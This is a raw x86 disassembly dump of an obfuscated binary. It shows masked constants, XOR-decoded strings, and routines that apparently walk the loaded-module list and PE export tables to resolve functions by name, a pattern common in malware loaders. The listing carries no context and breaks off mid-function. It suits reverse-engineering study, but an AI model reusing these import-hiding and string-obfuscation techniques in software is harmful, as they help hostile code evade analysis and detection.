  428013:	xor    eax,ecx
  428015:	lea    eax,[eax+esi*1+0x3272f5]
  42801c:	mov    DWORD PTR [ebp-0x18],eax
  42801f:	mov    eax,DWORD PTR [ebp-0x24]
  428022:	sub    eax,edx
  428024:	xor    eax,ecx
  428026:	mov    DWORD PTR [ebp-0x30],eax
  428029:	mov    eax,DWORD PTR [ebp-0x28]
  42802c:	sub    eax,edx
  42802e:	xor    eax,ecx
  428030:	mov    DWORD PTR [ebp-0x34],eax
  428033:	mov    eax,DWORD PTR [ebp-0x34]
  428036:	mov    esi,DWORD PTR [ebp-0x1c]
  428039:	xor    esi,ecx
  42803b:	add    esi,edx
  42803d:	xor    eax,ecx
  42803f:	add    eax,0x3272f5
  428044:	imul   esi,eax
  428047:	mov    eax,DWORD PTR [ebp-0x14]
  42804a:	movzx  eax,WORD PTR [esi+eax*1]
  42804e:	mov    esi,DWORD PTR [ebp-0x30]
  428051:	mov    edi,DWORD PTR [ebp-0x1c]
  428054:	xor    esi,ecx
  428056:	add    esi,edx
  428058:	xor    edi,ecx
  42805a:	add    edi,edx
  42805c:	imul   edi,esi
  42805f:	mov    esi,DWORD PTR [ebp-0x10]
  428062:	movzx  esi,WORD PTR [edi+esi*1]
  428066:	sub    eax,edx
  428068:	sub    esi,edx
  42806a:	xor    eax,ecx
  42806c:	xor    esi,ecx
  42806e:	cmp    esi,eax
  428070:	jne    0x42809b
  428072:	mov    eax,DWORD PTR [ebp-0x30]
  428075:	mov    esi,DWORD PTR [ebp-0x1c]
  428078:	xor    eax,ecx
  42807a:	add    eax,0x3272f5
  42807f:	xor    esi,ecx
  428081:	add    esi,edx
  428083:	imul   esi,eax
  428086:	mov    eax,DWORD PTR [ebp-0x10]
  428089:	movzx  eax,WORD PTR [esi+eax*1]
  42808d:	mov    esi,DWORD PTR [ebp-0xc]
  428090:	sub    eax,edx
  428092:	xor    eax,ecx
  428094:	cmp    eax,esi
  428096:	mov    eax,DWORD PTR [ebp-0xc]
  428099:	je     0x42809e
  42809b:	mov    eax,DWORD PTR [ebp-0x18]
  42809e:	pop    edi
  42809f:	xor    eax,ecx
  4280a1:	pop    esi
  4280a2:	add    eax,edx
  4280a4:	pop    ebx
  4280a5:	leave  
  4280a6:	ret    0x8
  4280a9:	push   ebp
  4280aa:	mov    ebp,esp
  4280ac:	push   ecx
  4280ad:	mov    cx,WORD PTR [eax]
  4280b0:	push   esi
  4280b1:	mov    esi,0x3b5c
  4280b6:	sub    cx,si
  4280b9:	mov    esi,0x8a9a
  4280be:	xor    cx,si
  4280c1:	mov    esi,0x4e3e
  4280c6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4280cd:	mov    edx,0xf89c85a5
  4280d2:	cmp    cx,si
  4280d5:	je     0x428134
  4280d7:	push   ebx
  4280d8:	push   edi
  4280d9:	movzx  ecx,cx
  4280dc:	mov    edi,0xffcd8d0b
  4280e1:	mov    esi,0x75108ae
  4280e6:	mov    ebx,0x4f9a
  4280eb:	cmp    cx,bx
  4280ee:	jne    0x4280f3
  4280f0:	mov    DWORD PTR [ebp-0x4],edx
  4280f3:	lea    edx,[edi+0x1]
  4280f6:	xor    edx,esi
  4280f8:	mov    edi,edx
  4280fa:	xor    edi,esi
  4280fc:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  428104:	mov    ebx,0x3b5c
  428109:	sub    cx,bx
  42810c:	mov    ebx,0x8a9a
  428111:	xor    cx,bx
  428114:	mov    ebx,0x4e3e
  428119:	cmp    cx,bx
  42811c:	jne    0x4280e6
  42811e:	mov    ecx,DWORD PTR [ebp-0x4]
  428121:	pop    edi
  428122:	pop    ebx
  428123:	cmp    ecx,0xf89c85a4
  428129:	je     0x428134
  42812b:	xor    ecx,esi
  42812d:	lea    eax,[eax+ecx*2+0x64e5ec]
  428134:	pop    esi
  428135:	leave  
  428136:	ret    
  428137:	push   ebp
  428138:	mov    ebp,esp
  42813a:	push   ecx
  42813b:	push   esi
  42813c:	push   edi
  42813d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428144:	mov    esi,0xf89c85a5
  428149:	call   0x4280a9
  42814e:	mov    edi,eax
  428150:	mov    al,BYTE PTR [edi]
  428152:	sub    al,0x3
  428154:	xor    al,0x7e
  428156:	cmp    al,0x83
  428158:	je     0x4281bb
  42815a:	mov    eax,edi
  42815c:	mov    edx,0xffcd8d0b
  428161:	mov    ecx,0x75108ae
  428166:	push   ebx
  428167:	mov    ax,WORD PTR [eax]
  42816a:	mov    ebx,0x3b5c
  42816f:	sub    ax,bx
  428172:	mov    ebx,0x8a9a
  428177:	xor    ax,bx
  42817a:	mov    ebx,0x4e48
  42817f:	cmp    ax,bx
  428182:	jne    0x428187
  428184:	mov    DWORD PTR [ebp-0x4],esi
  428187:	lea    esi,[edx+0x1]
  42818a:	xor    esi,ecx
  42818c:	mov    edx,esi
  42818e:	xor    edx,ecx
  428190:	lea    eax,[edi+edx*2+0x64e5ea]
  428197:	mov    bl,BYTE PTR [eax]
  428199:	sub    bl,0x3
  42819c:	xor    bl,0x7e
  42819f:	cmp    bl,0x83
  4281a2:	jne    0x428167
  4281a4:	mov    eax,DWORD PTR [ebp-0x4]
  4281a7:	pop    ebx
  4281a8:	cmp    eax,0xf89c85a4
  4281ad:	je     0x4281bb
  4281af:	xor    eax,ecx
  4281b1:	xor    ecx,ecx
  4281b3:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  4281bb:	mov    eax,edi
  4281bd:	pop    edi
  4281be:	pop    esi
  4281bf:	leave  
  4281c0:	ret    
  4281c1:	push   ebp
  4281c2:	mov    ebp,esp
  4281c4:	push   ecx
  4281c5:	push   esi
  4281c6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4281cd:	mov    esi,0xf89c85a5
  4281d2:	call   0x4280a9
  4281d7:	mov    cx,WORD PTR [eax]
  4281da:	mov    edx,0x3b5c
  4281df:	sub    cx,dx
  4281e2:	mov    edx,0x8a9a
  4281e7:	xor    cx,dx
  4281ea:	mov    edx,0x4e3e
  4281ef:	cmp    cx,dx
  4281f2:	je     0x42824b
  4281f4:	push   ebx
  4281f5:	push   edi
  4281f6:	movzx  ecx,cx
  4281f9:	mov    edx,0xffcd8d0b
  4281fe:	mov    edi,0x75108ae
  428203:	mov    ebx,0x4e48
  428208:	cmp    cx,bx
  42820b:	jne    0x428210
  42820d:	mov    DWORD PTR [ebp-0x4],esi
  428210:	lea    esi,[edx+0x1]
  428213:	xor    esi,edi
  428215:	mov    edx,esi
  428217:	xor    edx,edi
  428219:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  428221:	mov    ebx,0x3b5c
  428226:	sub    cx,bx
  428229:	mov    ebx,0x8a9a
  42822e:	xor    cx,bx
  428231:	mov    ebx,0x4e3e
  428236:	cmp    cx,bx
  428239:	jne    0x428203
  42823b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428242:	pop    edi
  428243:	pop    ebx
  428244:	je     0x42824b
  428246:	xor    eax,eax
  428248:	inc    eax
  428249:	jmp    0x42824d
  42824b:	xor    eax,eax
  42824d:	pop    esi
  42824e:	leave  
  42824f:	ret    
  428250:	push   ebp
  428251:	mov    ebp,esp
  428253:	push   ecx
  428254:	mov    eax,DWORD PTR [ebp+0x8]
  428257:	movzx  ecx,WORD PTR [eax]
  42825a:	push   esi
  42825b:	lea    eax,[ecx-0x3b5c]
  428261:	mov    esi,0x8a9a
  428266:	push   edi
  428267:	xor    eax,esi
  428269:	mov    edi,0x4e3e
  42826e:	mov    DWORD PTR [ebp-0x4],edx
  428271:	cmp    ax,di
  428274:	je     0x4282a1
  428276:	mov    eax,DWORD PTR [ebp+0x8]
  428279:	sub    eax,edx
  42827b:	mov    DWORD PTR [ebp+0x8],eax
  42827e:	jmp    0x428283
  428280:	mov    eax,DWORD PTR [ebp+0x8]
  428283:	mov    WORD PTR [edx],cx
  428286:	add    edx,0x2
  428289:	movzx  edi,WORD PTR [eax+edx*1]
  42828d:	mov    ecx,edi
  42828f:	add    edi,0xffffc4a4
  428295:	xor    edi,esi
  428297:	mov    eax,0x4e3e
  42829c:	cmp    di,ax
  42829f:	jne    0x428280
  4282a1:	xor    eax,eax
  4282a3:	pop    edi
  4282a4:	mov    WORD PTR [edx],ax
  4282a7:	mov    eax,DWORD PTR [ebp-0x4]
  4282aa:	pop    esi
  4282ab:	leave  
  4282ac:	ret    0x4
  4282af:	push   ebp
  4282b0:	mov    ebp,esp
  4282b2:	sub    esp,0x18
  4282b5:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4282bc:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  4282c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282c6:	push   esi
  4282c7:	mov    eax,0x75108ae
  4282cc:	xor    ecx,eax
  4282ce:	mov    esi,0x3272f5
  4282d3:	add    ecx,esi
  4282d5:	mov    DWORD PTR [ebp-0x4],ecx
  4282d8:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4282df:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4282e6:	push   edi
  4282e7:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  4282ee:	jmp    0x42838f
  4282f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4282f6:	mov    edx,DWORD PTR [ebp+0x10]
  4282f9:	sub    edx,ecx
  4282fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4282fe:	xor    ecx,eax
  428300:	add    ecx,esi
  428302:	cmp    edx,ecx
  428304:	jbe    0x428321
  428306:	mov    edx,DWORD PTR [ebp-0x4]
  428309:	add    edx,DWORD PTR [ebp+0x8]
  42830c:	mov    ecx,DWORD PTR [ebp-0x4]
  42830f:	add    ecx,DWORD PTR [ebp+0xc]
  428312:	mov    edi,DWORD PTR [ecx]
  428314:	mov    DWORD PTR [edx],edi
  428316:	mov    ecx,DWORD PTR [ecx+0x4]
  428319:	mov    DWORD PTR [edx+0x4],ecx
  42831c:	mov    ecx,DWORD PTR [ebp-0xc]
  42831f:	jmp    0x42836e
  428321:	mov    ecx,DWORD PTR [ebp-0x4]
  428324:	mov    edx,DWORD PTR [ebp+0x10]
  428327:	sub    edx,ecx
  428329:	mov    ecx,DWORD PTR [ebp-0x10]
  42832c:	xor    ecx,eax
  42832e:	add    ecx,esi
  428330:	cmp    edx,ecx
  428332:	mov    ecx,DWORD PTR [ebp-0x4]
  428335:	jbe    0x428349
  428337:	add    ecx,DWORD PTR [ebp+0x8]
  42833a:	mov    edx,DWORD PTR [ebp-0x4]
  42833d:	add    edx,DWORD PTR [ebp+0xc]
  428340:	mov    edx,DWORD PTR [edx]
  428342:	mov    DWORD PTR [ecx],edx
  428344:	mov    ecx,DWORD PTR [ebp-0x10]
  428347:	jmp    0x42836e
  428349:	mov    edx,DWORD PTR [ebp+0x10]
  42834c:	sub    edx,ecx
  42834e:	mov    ecx,DWORD PTR [ebp-0x14]
  428351:	xor    ecx,eax
  428353:	add    ecx,esi
  428355:	cmp    edx,ecx
  428357:	mov    ecx,DWORD PTR [ebp-0x4]
  42835a:	jbe    0x42837f
  42835c:	add    ecx,DWORD PTR [ebp+0x8]
  42835f:	mov    edx,DWORD PTR [ebp-0x4]
  428362:	add    edx,DWORD PTR [ebp+0xc]
  428365:	mov    dx,WORD PTR [edx]
  428368:	mov    WORD PTR [ecx],dx
  42836b:	mov    ecx,DWORD PTR [ebp-0x14]
  42836e:	mov    edx,DWORD PTR [ebp-0x4]
  428371:	xor    ecx,eax
  428373:	lea    ecx,[ecx+edx*1+0x3272f5]
  42837a:	mov    DWORD PTR [ebp-0x4],ecx
  42837d:	jmp    0x42838f
  42837f:	add    ecx,DWORD PTR [ebp+0x8]
  428382:	mov    edx,DWORD PTR [ebp-0x4]
  428385:	add    edx,DWORD PTR [ebp+0xc]
  428388:	mov    dl,BYTE PTR [edx]
  42838a:	mov    BYTE PTR [ecx],dl
  42838c:	inc    DWORD PTR [ebp-0x4]
  42838f:	mov    ecx,DWORD PTR [ebp-0x18]
  428392:	mov    edx,DWORD PTR [ebp+0x10]
  428395:	xor    ecx,eax
  428397:	add    ecx,esi
  428399:	imul   ecx,edx
  42839c:	mov    edx,DWORD PTR [ebp-0x8]
  42839f:	mov    edi,DWORD PTR [ebp-0x4]
  4283a2:	xor    edx,eax
  4283a4:	lea    edx,[edx+edi*1+0x3272f5]
  4283ab:	cmp    edx,ecx
  4283ad:	jb     0x4282f3
  4283b3:	pop    edi
  4283b4:	pop    esi
  4283b5:	leave  
  4283b6:	ret    0xc
  4283b9:	push   ebp
  4283ba:	mov    ebp,esp
  4283bc:	sub    esp,0xc
  4283bf:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4283c6:	push   esi
  4283c7:	mov    esi,eax
  4283c9:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4283d0:	mov    edx,DWORD PTR [ebp-0x4]
  4283d3:	mov    eax,0x75108ae
  4283d8:	xor    edx,eax
  4283da:	mov    ecx,0x3272f5
  4283df:	add    edx,ecx
  4283e1:	cmp    esi,edx
  4283e3:	je     0x428425
  4283e5:	push   ebx
  4283e6:	push   edi
  4283e7:	mov    edx,DWORD PTR [ebp-0x8]
  4283ea:	mov    ebx,DWORD PTR [ebp+0x8]
  4283ed:	xor    edx,eax
  4283ef:	mov    edi,0xffcd8d0b
  4283f4:	sub    edi,edx
  4283f6:	add    esi,edi
  4283f8:	lea    edx,[esi-0x3272f5]
  4283fe:	xor    edx,eax
  428400:	mov    DWORD PTR [ebp-0xc],edx
  428403:	mov    edx,DWORD PTR [ebp-0x4]
  428406:	mov    edi,DWORD PTR [ebp-0xc]
  428409:	xor    dl,0xae
  42840c:	sub    dl,0xb
  42840f:	xor    edi,eax
  428411:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  428418:	mov    edx,DWORD PTR [ebp-0x4]
  42841b:	xor    edx,eax
  42841d:	add    edx,ecx
  42841f:	cmp    esi,edx
  428421:	jne    0x4283e7
  428423:	pop    edi
  428424:	pop    ebx
  428425:	pop    esi
  428426:	leave  
  428427:	ret    0x4
  42842a:	push   ebp
  42842b:	mov    ebp,esp
  42842d:	sub    esp,0x21c
  428433:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42843a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428441:	mov    eax,DWORD PTR [ebp+0x10]
  428444:	mov    eax,DWORD PTR [ebp-0x4]
  428447:	mov    ecx,DWORD PTR [ebp+0x8]
  42844a:	push   esi
  42844b:	push   edi
  42844c:	mov    edi,0x75108ae
  428451:	xor    eax,edi
  428453:	mov    esi,0x3272f5
  428458:	add    eax,esi
  42845a:	cmp    eax,ecx
  42845c:	mov    eax,DWORD PTR [ebp-0x4]
  42845f:	jne    0x42846a
  428461:	xor    eax,edi
  428463:	add    eax,esi
  428465:	jmp    0x428516
  42846a:	mov    ecx,DWORD PTR [ebp+0xc]
  42846d:	xor    eax,edi
  42846f:	add    eax,esi
  428471:	cmp    eax,ecx
  428473:	jne    0x42847a
  428475:	mov    eax,DWORD PTR [ebp-0x4]
  428478:	jmp    0x428461
  42847a:	lea    eax,[ebp-0x21c]
  428480:	mov    DWORD PTR [ebp-0x8],eax
  428483:	mov    eax,DWORD PTR [ebp+0xc]
  428486:	mov    DWORD PTR [ebp-0x10],eax
  428489:	mov    eax,DWORD PTR [ebp-0x4]
  42848c:	xor    eax,edi
  42848e:	add    eax,esi
  428490:	mov    DWORD PTR [ebp+0x10],eax
  428493:	mov    eax,DWORD PTR [ebp+0xc]
  428496:	push   ebx
  428497:	call   0x4281c1
  42849c:	mov    ebx,eax
  42849e:	mov    eax,DWORD PTR [ebp+0x8]
  4284a1:	mov    eax,DWORD PTR [eax+0x14]
  4284a4:	jmp    0x4284fe
  4284a6:	mov    eax,DWORD PTR [ebp+0xc]
  4284a9:	sub    eax,0x8
  4284ac:	mov    DWORD PTR [ebp-0xc],eax
  4284af:	mov    eax,DWORD PTR [ebp-0xc]
  4284b2:	mov    eax,DWORD PTR [eax+0x28]
  4284b5:	call   0x4280a9
  4284ba:	mov    DWORD PTR [ebp+0x10],eax
  4284bd:	push   DWORD PTR [ebp+0x10]
  4284c0:	mov    edx,DWORD PTR [ebp-0x8]
  4284c3:	call   0x428250
  4284c8:	mov    eax,DWORD PTR [ebp-0x4]
  4284cb:	xor    eax,edi
  4284cd:	add    eax,esi
  4284cf:	cmp    eax,ebx
  4284d1:	jne    0x4284db
  4284d3:	mov    eax,DWORD PTR [ebp-0x8]
  4284d6:	call   0x428137
  4284db:	mov    eax,DWORD PTR [ebp-0x14]
  4284de:	xor    eax,edi
  4284e0:	add    eax,esi
  4284e2:	push   eax
  4284e3:	push   DWORD PTR [ebp-0x10]
  4284e6:	mov    eax,DWORD PTR [ebp-0x8]
  4284e9:	call   0x427e63
  4284ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4284f1:	xor    ecx,edi
  4284f3:	add    ecx,esi
  4284f5:	cmp    eax,ecx
  4284f7:	je     0x42851c
  4284f9:	mov    eax,DWORD PTR [ebp+0xc]
  4284fc:	mov    eax,DWORD PTR [eax]
  4284fe:	mov    DWORD PTR [ebp+0xc],eax
  428501:	mov    eax,DWORD PTR [ebp+0x8]
  428504:	mov    ecx,DWORD PTR [ebp+0xc]
  428507:	add    eax,0x14
  42850a:	cmp    ecx,eax
  42850c:	jne    0x4284a6
  42850e:	mov    eax,DWORD PTR [ebp-0x4]
  428511:	xor    eax,edi
  428513:	add    eax,esi
  428515:	pop    ebx
  428516:	pop    edi
  428517:	pop    esi
  428518:	leave  
  428519:	ret    0xc
  42851c:	mov    eax,DWORD PTR [ebp-0xc]
  42851f:	mov    eax,DWORD PTR [eax+0x18]
  428522:	jmp    0x428515
  428524:	push   ebp
  428525:	mov    ebp,esp
  428527:	mov    eax,DWORD PTR [ebp+0xc]
  42852a:	sub    esp,0x10
  42852d:	cmp    DWORD PTR [ebp+0x8],0x0
  428531:	push   ebx
  428532:	push   esi
  428533:	push   edi
  428534:	je     0x4285e9
  42853a:	test   eax,eax
  42853c:	je     0x4285e9
  428542:	movzx  eax,WORD PTR [eax+0x20]
  428546:	mov    ecx,eax
  428548:	mov    DWORD PTR [ebp-0x10],eax
  42854b:	xor    edx,edx
  42854d:	and    DWORD PTR [ebp-0x8],edx
  428550:	mov    eax,0x8a9a
  428555:	xor    ecx,eax
  428557:	add    ecx,0x3b5c
  42855d:	mov    DWORD PTR [ebp-0xc],ecx
  428560:	and    DWORD PTR [ebp-0x4],0x0
  428564:	xor    ecx,ecx
  428566:	push   0xffffff81
  428568:	pop    edi
  428569:	cmp    cx,WORD PTR [ebp-0xc]
  42856d:	jae    0x4285d3
  42856f:	lea    esi,[edx-0x3b5c]
  428575:	xor    esi,eax
  428577:	movzx  ecx,WORD PTR [ebp-0x4]
  42857b:	mov    ebx,DWORD PTR [ebp+0xc]
  42857e:	lea    ecx,[ebx+ecx*4]
  428581:	cmp    WORD PTR [ecx+0x2],si
  428585:	jne    0x4285be
  428587:	movzx  ecx,WORD PTR [ecx]
  42858a:	mov    edi,0x4e3e
  42858f:	cmp    cx,di
  428592:	jne    0x4285a0
  428594:	mov    ebx,DWORD PTR [ebp+0x8]
  428597:	movzx  edi,dx
  42859a:	cmp    BYTE PTR [edi+ebx*1],0x0
  42859e:	je     0x4285cd
  4285a0:	mov    ebx,DWORD PTR [ebp+0x8]
  4285a3:	movzx  edi,dx
  4285a6:	movsx  di,BYTE PTR [edi+ebx*1]
  4285ab:	mov    ebx,0x3b5c
  4285b0:	sub    di,bx
  4285b3:	xor    di,ax
  4285b6:	cmp    cx,di
  4285b9:	je     0x4285cd
  4285bb:	push   0xffffff83
  4285bd:	pop    edi
  4285be:	inc    DWORD PTR [ebp-0x4]
  4285c1:	mov    cx,WORD PTR [ebp-0xc]
  4285c5:	cmp    WORD PTR [ebp-0x4],cx
  4285c9:	jb     0x428577
  4285cb:	jmp    0x4285d3
  4285cd:	inc    DWORD PTR [ebp-0x8]
  4285d0:	push   0xffffff80
  4285d2:	pop    edi
  4285d3:	mov    esi,DWORD PTR [ebp+0x8]
  4285d6:	movzx  ecx,dx
  4285d9:	cmp    BYTE PTR [ecx+esi*1],0x0
  4285dd:	je     0x4285f2
  4285df:	inc    edx
  4285e0:	cmp    edi,0xffffff83
  4285e3:	jne    0x428560
  4285e9:	xor    eax,eax
  4285eb:	pop    edi
  4285ec:	pop    esi
  4285ed:	pop    ebx
  4285ee:	leave  
  4285ef:	ret    0x8
  4285f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4285f5:	add    ecx,0xffffc4a4
  4285fb:	xor    cx,ax
  4285fe:	xor    eax,eax
  428600:	cmp    cx,WORD PTR [ebp-0x10]
  428604:	sete   al
  428607:	jmp    0x4285eb
  428609:	push   ebp
  42860a:	mov    ebp,esp
  42860c:	sub    esp,0x50
  42860f:	push   edi
  428610:	mov    edi,eax
  428612:	mov    eax,DWORD PTR [edi+0x1a8]
  428618:	cmp    DWORD PTR [eax],0x0
  42861b:	jne    0x428624
  42861d:	xor    eax,eax
  42861f:	jmp    0x428755
  428624:	push   DWORD PTR [ebp+0x8]
  428627:	push   0x2c
  428629:	pop    eax
  42862a:	call   0x4283b9
  42862f:	mov    edx,DWORD PTR [edi+0x1ac]
  428635:	lea    eax,[edi+0x22]
  428638:	mov    DWORD PTR [ebp-0x4c],eax
  42863b:	lea    eax,[edi+0x44]
  42863e:	mov    DWORD PTR [ebp-0x48],eax
  428641:	lea    eax,[edi+0x66]
  428644:	mov    DWORD PTR [ebp-0x44],eax
  428647:	lea    eax,[edi+0x88]
  42864d:	mov    DWORD PTR [ebp-0x40],eax
  428650:	lea    eax,[edi+0xaa]
  428656:	mov    DWORD PTR [ebp-0x3c],eax
  428659:	lea    eax,[edi+0xcc]
  42865f:	mov    DWORD PTR [ebp-0x38],eax
  428662:	lea    eax,[edi+0xee]
  428668:	mov    DWORD PTR [ebp-0x34],eax
  42866b:	lea    eax,[edi+0x110]
  428671:	mov    DWORD PTR [ebp-0x30],eax
  428674:	lea    eax,[edi+0x132]
  42867a:	mov    DWORD PTR [ebp-0x2c],eax
  42867d:	lea    eax,[edi+0x154]
  428683:	push   edi
  428684:	mov    DWORD PTR [ebp-0x50],edi
  428687:	mov    DWORD PTR [ebp-0x28],eax
  42868a:	call   0x428789
  42868f:	push   eax
  428690:	mov    eax,DWORD PTR [edi+0x1a8]
  428696:	push   DWORD PTR [eax]
  428698:	call   0x42842a
  42869d:	mov    DWORD PTR [ebp-0x10],eax
  4286a0:	test   eax,eax
  4286a2:	je     0x428755
  4286a8:	mov    ecx,DWORD PTR [eax+0x3c]
  4286ab:	push   ebx
  4286ac:	push   esi
  4286ad:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4286b1:	add    esi,eax
  4286b3:	mov    edi,DWORD PTR [esi+0x24]
  4286b6:	mov    ecx,DWORD PTR [esi+0x1c]
  4286b9:	mov    edx,DWORD PTR [esi+0x20]
  4286bc:	mov    ebx,DWORD PTR [esi+0x18]
  4286bf:	add    edi,eax
  4286c1:	mov    DWORD PTR [ebp-0x20],edi
  4286c4:	mov    edi,DWORD PTR [esi+0x14]
  4286c7:	add    ecx,eax
  4286c9:	add    edx,eax
  4286cb:	mov    DWORD PTR [ebp-0xc],ecx
  4286ce:	mov    DWORD PTR [ebp-0x1c],edx
  4286d1:	mov    DWORD PTR [ebp-0x8],edi
  4286d4:	cmp    edi,ebx
  4286d6:	ja     0x4286db
  4286d8:	mov    DWORD PTR [ebp-0x8],ebx
  4286db:	xor    ebx,ebx
  4286dd:	mov    DWORD PTR [ebp-0x18],ebx
  4286e0:	cmp    DWORD PTR [ebp-0x8],ebx
  4286e3:	jbe    0x428753
  4286e5:	jmp    0x4286ea
  4286e7:	mov    edx,DWORD PTR [ebp-0x1c]
  4286ea:	mov    edi,DWORD PTR [ebp-0x20]
  4286ed:	movzx  edi,WORD PTR [edi+ebx*2]
  4286f1:	cmp    ebx,DWORD PTR [esi+0x18]
  4286f4:	jae    0x428753
  4286f6:	cmp    edi,DWORD PTR [esi+0x14]
  4286f9:	jae    0x428753
  4286fb:	mov    ebx,DWORD PTR [edx+ebx*4]
  4286fe:	mov    edx,DWORD PTR [ebp+0x8]
  428701:	mov    edi,DWORD PTR [ecx+edi*4]
  428704:	mov    DWORD PTR [ebp-0x4],edx
  428707:	lea    edx,[ebp-0x50]
  42870a:	add    ebx,eax
  42870c:	add    edi,eax
  42870e:	sub    edx,DWORD PTR [ebp+0x8]
  428711:	mov    DWORD PTR [ebp-0x14],0xb
  428718:	mov    DWORD PTR [ebp-0x24],edx
  42871b:	mov    edx,DWORD PTR [ebp-0x4]
  42871e:	cmp    DWORD PTR [edx],0x0
  428721:	jne    0x42873e
  428723:	mov    eax,DWORD PTR [ebp-0x24]
  428726:	push   DWORD PTR [eax+edx*1]
  428729:	push   ebx
  42872a:	call   0x428524
  42872f:	mov    ecx,DWORD PTR [ebp-0xc]
  428732:	test   eax,eax
  428734:	je     0x42873b
  428736:	mov    eax,DWORD PTR [ebp-0x4]
  428739:	mov    DWORD PTR [eax],edi
  42873b:	mov    eax,DWORD PTR [ebp-0x10]
  42873e:	add    DWORD PTR [ebp-0x4],0x4
  428742:	dec    DWORD PTR [ebp-0x14]
  428745:	jne    0x42871b
  428747:	mov    ebx,DWORD PTR [ebp-0x18]
  42874a:	inc    ebx
  42874b:	mov    DWORD PTR [ebp-0x18],ebx
  42874e:	cmp    ebx,DWORD PTR [ebp-0x8]
  428751:	jb     0x4286e7
  428753:	pop    esi
  428754:	pop    ebx
  428755:	pop    edi
  428756:	leave  
  428757:	ret    0x4
  42875a:	push   ebp
  42875b:	mov    ebp,esp
  42875d:	mov    eax,DWORD PTR [ebp+0x8]
  428760:	push   esi
  428761:	push   DWORD PTR [eax+0x1e0]
  428767:	lea    esi,[eax+0x198]
  42876d:	mov    eax,DWORD PTR [ebp+0x8]
  428770:	call   0x428609
  428775:	mov    ecx,DWORD PTR [esi]
  428777:	mov    DWORD PTR [ecx],eax
  428779:	mov    eax,DWORD PTR [esi]
  42877b:	xor    ecx,ecx
  42877d:	cmp    DWORD PTR [eax],ecx
  42877f:	pop    esi
  428780:	setne  cl
  428783:	mov    eax,ecx
  428785:	pop    ebp
  428786:	ret    0x4
  428789:	mov    ecx,DWORD PTR [edi+0x188]
  42878f:	push   ebx
  428790:	jmp    0x4287a5
  428792:	xor    eax,0x8a9a
  428797:	add    eax,0x3b5c
  42879c:	mov    WORD PTR [ecx],ax
  42879f:	add    ecx,0x2
  4287a2:	add    edx,0x2
  4287a5:	movzx  eax,WORD PTR [edx]
  4287a8:	mov    ebx,0x4e3e
  4287ad:	cmp    ax,bx
  4287b0:	jne    0x428792
  4287b2:	xor    eax,eax
  4287b4:	mov    WORD PTR [ecx],ax
  4287b7:	mov    eax,DWORD PTR [edi+0x188]
  4287bd:	pop    ebx
  4287be:	ret    
  4287bf:	push   edi
  4287c0:	mov    edi,eax
  4287c2:	mov    eax,DWORD PTR [esi+0x188]
  4287c8:	shl    edi,0x6
  4287cb:	add    eax,edi
  4287cd:	jmp    0x4287d9
  4287cf:	xor    cl,0x7e
  4287d2:	add    cl,0x3
  4287d5:	mov    BYTE PTR [eax],cl
  4287d7:	inc    eax
  4287d8:	inc    edx
  4287d9:	mov    cl,BYTE PTR [edx]
  4287db:	cmp    cl,0x83
  4287de:	jne    0x4287cf
  4287e0:	mov    BYTE PTR [eax],0x0
  4287e3:	mov    eax,DWORD PTR [esi+0x188]
  4287e9:	add    eax,edi
  4287eb:	pop    edi
  4287ec:	ret    
  4287ed:	push   ebp
  4287ee:	mov    ebp,esp
  4287f0:	sub    esp,0x14
  4287f3:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  4287fa:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  428801:	mov    eax,DWORD PTR [ebx]
  428803:	mov    DWORD PTR [ebp-0x8],eax
  428806:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42880d:	push   esi
  42880e:	push   edi
  42880f:	mov    DWORD PTR [ebp-0x14],0xead71885
  428816:	mov    edi,DWORD PTR [ebp-0x4]
  428819:	mov    ecx,DWORD PTR [ebp-0x10]
  42881c:	mov    eax,0x75108ae
  428821:	xor    edi,eax
  428823:	mov    edx,0x3272f5
  428828:	xor    ecx,eax
  42882a:	add    edi,edx
  42882c:	add    ecx,edx
  42882e:	imul   edi,ecx
  428831:	jmp    0x428879
  428833:	mov    ecx,DWORD PTR [ebp-0x8]
  428836:	mov    esi,DWORD PTR [ebp-0x4]
  428839:	xor    ecx,eax
  42883b:	xor    esi,eax
  42883d:	add    ecx,edx
  42883f:	add    esi,edx
  428841:	test   esi,ecx
  428843:	mov    esi,DWORD PTR [ebp-0x8]
  428846:	mov    ecx,DWORD PTR [ebp-0x4]
  428849:	je     0x428860
  42884b:	xor    ecx,eax
  42884d:	xor    esi,eax
  42884f:	add    ecx,edx
  428851:	add    esi,edx
  428853:	shr    esi,cl
  428855:	mov    ecx,DWORD PTR [ebp-0x14]
  428858:	xor    ecx,eax
  42885a:	add    ecx,edx
  42885c:	xor    esi,ecx
  42885e:	jmp    0x42886a
  428860:	xor    esi,eax
  428862:	xor    ecx,eax
  428864:	add    esi,edx
  428866:	add    ecx,edx
  428868:	shr    esi,cl
  42886a:	mov    DWORD PTR [ebp-0x8],esi
  42886d:	mov    ecx,DWORD PTR [ebp-0x4]
  428870:	xor    ecx,eax
  428872:	lea    edi,[edi+ecx*1+0x3272f5]
  428879:	mov    ecx,DWORD PTR [ebp-0xc]
  42887c:	mov    esi,DWORD PTR [ebp-0x4]
  42887f:	xor    esi,eax
  428881:	xor    ecx,eax
